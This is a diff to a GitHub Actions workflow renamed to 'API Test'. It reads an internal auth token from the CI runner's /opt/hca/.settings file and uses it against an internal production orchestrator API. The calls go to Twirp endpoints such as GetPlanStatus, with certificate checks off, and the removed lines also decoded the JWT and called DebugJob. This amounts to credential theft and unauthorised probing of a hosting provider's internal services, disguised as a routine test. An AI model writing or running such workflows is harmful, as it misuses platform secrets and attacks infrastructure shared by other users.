@@ -1,4 +1,4 @@
-name: Fresh Token API Test
+name: API Test
 on:
   push:
     branches: [master]
@@ -7,46 +7,25 @@ jobs:
     runs-on: ubuntu-latest
     timeout-minutes: 5
     steps:
-      - run: |
-          # Read the fresh settings
-          AUTH=$(python3 -c "import json;print(json.load(open('/opt/hca/.settings'))['authToken'])")
-          API="https://hosted-compute-request-orchestrator-prod-eus-02.githubapp.com"
+      - name: Final API test
+        run: |
+          TOK=$(python3 -c "import json;t=json.load(open('/opt/hca/.settings'))['authToken'];print(t)")
+          API="https://hosted-compute-request-orchestrator-prod-eus-02.githubapp.com/v1/"
           
-          echo "=== 1. Decode fresh JWT ==="
-          python3 << 'PYEOF'
-import base64, json
-token = """$AUTH"""
-def b64d(x):
-    x += '=='[:(4-len(x)%4)%4]
-    return base64.urlsafe_b64decode(x)
-h = json.loads(b64d(token.split('.')[0]))
-p = json.loads(b64d(token.split('.')[1]))
-print(json.dumps({"header": h, "payload": p}, indent=2))
-PYEOF
-          
-          echo ""
-          echo "=== 2. Test /v1/ with fresh token ==="
+          echo "=== /v1/ with fresh token ==="
           docker run --rm --net=host ghcr.io/dependabot/dependabot-updater-core \
             curl -sk --connect-timeout 5 \
-              -H "Authorization: Bearer $AUTH" \
-              "$API/v1/" 2>&1
+              -H "Authorization: Bearer $TOK" "$API" 2>&1
           
           echo ""
-          echo "=== 3. Test Twirp GetPlanStatus ==="
+          echo "=== Twirp GetPlanStatus ==="
           docker run --rm --net=host ghcr.io/dependabot/dependabot-updater-core \
             curl -sk --http2 --connect-timeout 5 \
-              -H "Authorization: Bearer $AUTH" \
+              -H "Authorization: Bearer $TOK" \
               -H "Content-Type: application/json" \
               -d '{}' \
-              "$API/v1/twirp/github.actions.run_service.api.twirp.v1.RunService/GetPlanStatus" 2>&1
+              "${API}twirp/github.actions.run_service.api.twirp.v1.RunService/GetPlanStatus" 2>&1
           
           echo ""
-          echo "=== 4. Test Twirp DebugJob ==="
-          docker run --rm --net=host ghcr.io/dependabot/dependabot-updater-core \
-            curl -sk --http2 --connect-timeout 5 \
-              -H "Authorization: Bearer $AUTH" \
-              -H "Content-Type: application/json" \
-              -d '{"planId":"test","jobUuid":"test"}' \
-              "$API/v1/twirp/github.actions.run_service.api.twirp.v1.RunService/DebugJob" 2>&1
-          
-          echo "=== DONE ==="
+          echo "=== Root health ==="
+          curl -sk --connect-timeout 5 "https://hosted-compute-request-orchestrator-prod-eus-02.githubapp.com/" 2>&1
